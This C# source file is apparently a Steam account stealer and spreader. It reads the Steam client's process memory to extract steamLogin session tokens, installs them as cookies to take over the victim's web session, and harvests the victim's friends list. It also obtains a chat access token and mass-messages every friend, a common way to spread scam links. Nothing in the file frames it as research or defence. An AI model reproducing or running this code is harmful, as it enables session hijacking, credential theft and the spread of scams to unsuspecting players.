using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

public class SteamWorker
{
    public CookieContainer cookiesContainer = new CookieContainer();
    private List<string> friends = new List<string>();
    public List<string> ParsedSteamCookies = new List<string>();

    private string getCookieValue(CookieContainer input_cc, string name)
    {
        Hashtable hashtable = (Hashtable) typeof(CookieContainer).GetField("m_domainTable", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(input_cc);
        foreach (string str in hashtable.Keys)
        {
            object obj2 = hashtable[str];
            SortedList list = (SortedList) obj2.GetType().GetField("m_list", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(obj2);
            foreach (string str2 in list.Keys)
            {
                CookieCollection cookies = (CookieCollection) list[str2];
                foreach (Cookie cookie in cookies)
                {
                    if (cookie.Name == name)
                    {
                        return cookie.Value.ToString();
                    }
                }
            }
        }
        return string.Empty;
    }

    public void getFriends()
    {
        this.friends.Clear();
        string[] strArray = SteamHttp.SteamWebRequest(this.cookiesContainer, "profiles/" + this.steamID + "/friends/", null, "").Split(new string[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
        try
        {
            for (int i = 0; i < strArray.Length; i++)
            {
                if (strArray[i].IndexOf("name=\"friends") != -1)
                {
                    string item = strArray[i].Split(new char[] { '[', ']' })[3];
                    if (!this.friends.Contains(item))
                    {
                        this.friends.Add(item);
                    }
                }
            }
        }
        catch
        {
        }
    }

    public void getSessionID()
    {
        while (!SteamHttp.ObtainsessionID(this.cookiesContainer))
        {
        }
        if (this.cookiesContainer.Count < 4)
        {
            this.cookiesContainer = new CookieContainer();
            this.setCookies(true);
            this.getSessionID();
        }
        else
        {
            this.sessionID = this.getCookieValue(this.cookiesContainer, "sessionid");
        }
    }

    public void initChatSystem()
    {
        int num;
        string[] strArray = SteamHttp.SteamWebRequest(this.cookiesContainer, "chat/", null, "").Split(new string[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
        for (num = 0; num < strArray.Length; num++)
        {
            if (strArray[num].IndexOf("WebAPI = new CWebAPI") != -1)
            {
                this.access_token = strArray[num].Split(new char[] { '"' })[1];
                break;
            }
        }
        string str2 = this.randomInt(13);
        string[] strArray2 = SteamHttp.SteamWebRequest(this.cookiesContainer, "https://api.steampowered.com/ISteamWebUserPresenceOAuth/Logon/v0001/?jsonp=jQuery" + this.randomInt(0x16) + "_" + str2 + "&ui_mode=web&access_token=" + this.access_token + "&_=" + str2, null, "").Split(new char[] { '"' });
        for (num = 0; num < strArray2.Length; num++)
        {
            if (strArray2[num] == "umqid")
            {
                this.umquid = strArray2[num + 2];
                break;
            }
        }
    }

    public void ParseSteamCookies()
    {
        Process[] processArray;
        this.ParsedSteamCookies.Clear();
        WinApis.SYSTEM_INFO input = new WinApis.SYSTEM_INFO();
        while (input.minimumApplicationAddress.ToInt32() == 0)
        {
            WinApis.GetSystemInfo(out input);
        }
        IntPtr minimumApplicationAddress = input.minimumApplicationAddress;
        long num = minimumApplicationAddress.ToInt32();
        List<string> list = new List<string>();
        processArray = processArray = Process.GetProcessesByName("steam");
        Process process = null;
        for (int i = 0; i < processArray.Length; i++)
        {
            try
            {
                foreach (ProcessModule module in processArray[i].Modules)
                {
                    if (module.FileName.EndsWith("steamclient.dll"))
                    {
                        process = processArray[i];
                        continue;
                    }
                }
            }
            catch
            {
            }
        }
        if (process != null)
        {
            IntPtr handle = WinApis.OpenProcess(0x410, false, process.Id);
            WinApis.PROCESS_QUERY_INFORMATION processQuery = new WinApis.PROCESS_QUERY_INFORMATION();
            IntPtr numberofbytesread = new IntPtr(0);
            while (WinApis.VirtualQueryEx(handle, minimumApplicationAddress, out processQuery, 0x1c) != 0)
            {
                if ((processQuery.Protect == 4) && (processQuery.State == 0x1000))
                {
                    byte[] buffer = new byte[processQuery.RegionSize];
                    WinApis.ReadProcessMemory(handle, processQuery.BaseAdress, buffer, processQuery.RegionSize, out numberofbytesread);
                    string str = Encoding.UTF8.GetString(buffer);
                    MatchCollection matchs = new Regex("7656119[0-9]{10}%7c%7c[A-F0-9]{40}", RegexOptions.IgnoreCase).Matches(str);
                    if (matchs.Count > 0)
                    {
                        foreach (Match match in matchs)
                        {
                            if (!list.Contains(match.Value))
                            {
                                list.Add(match.Value);
                            }
                        }
                    }
                }
                num += processQuery.RegionSize;
                if (num >= 0x7fffffffL)
                {
                    break;
                }
                minimumApplicationAddress = new IntPtr(num);
            }
            this.ParsedSteamCookies = list;
            if (list.Count >= 2)
            {
                this.setCookies(false);
            }
            else
            {
                this.ParsedSteamCookies.Clear();
                this.ParseSteamCookies();
            }
        }
    }


    public string randomInt(int count)
    {
        Random random = new Random();
        StringBuilder builder = new StringBuilder();
        for (int i = 0; i < count; i++)
        {
            builder.Append(random.Next(0, 10)).ToString();
        }
        return builder.ToString();
    }

    public void sendMessage(string steamID, string message)
    {
        string str = this.randomInt(0x16);
        string str2 = this.randomInt(13);
        string url = string.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", new object[] { str, str2, this.umquid, steamID, Uri.EscapeDataString(message), this.access_token });
        SteamHttp.SteamWebRequest(this.cookiesContainer, url, null, "");
    }

    public void sendMessageToFriends(string message)
    {
        for (int i = 0; i < this.friends.Count; i++)
        {
            string str = this.randomInt(0x16);
            string str2 = this.randomInt(13);
            string url = string.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", new object[] { str, str2, this.umquid, this.friends[i], Uri.EscapeDataString(message), this.access_token });
            SteamHttp.SteamWebRequest(this.cookiesContainer, url, null, "");
        }
    }


    public void setCookies(bool a)
    {
        this.cookiesContainer.SetCookies(new Uri("http://steamcommunity.com"), "steamLogin=" + this.ParsedSteamCookies[a ? 0 : 1]);
        this.cookiesContainer.SetCookies(new Uri("http://steamcommunity.com"), "steamLoginSecure=" + this.ParsedSteamCookies[a ? 1 : 0]);
    }

    private string access_token { get; set; }

    private string sessionID { get; set; }

    private string steamID
    {
        get
        {
            return ((this.ParsedSteamCookies.Count > 0) ? this.ParsedSteamCookies[0].Substring(0, 0x11) : null);
        }
    }

    private string umquid { get; set; }

    public enum OfferStatus
    {
        Accepted,
        Abuse,
        Error
    }
}

